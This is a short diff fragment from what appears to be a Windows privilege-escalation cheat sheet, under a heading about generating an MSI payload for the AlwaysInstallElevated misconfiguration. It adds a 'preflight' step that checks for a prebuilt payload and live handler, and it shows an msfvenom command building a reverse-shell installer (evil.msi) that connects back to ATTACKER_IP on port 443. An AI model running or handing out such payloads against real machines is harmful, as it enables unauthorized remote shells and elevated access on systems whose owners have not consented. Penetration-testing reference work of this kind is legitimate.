@@ -367,6 +367,9 @@ Get-RegistryAlwaysInstallElevated
 
 ### Generate MSI Payload
 
+Preflight first — `python3 tools/preflight/pick.py --platform windows --arch x64 --format msi`
+(HIT → path + handler already live; MISS → msfvenom below).
+
 ```bash
 # Reverse shell MSI
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o evil.msi
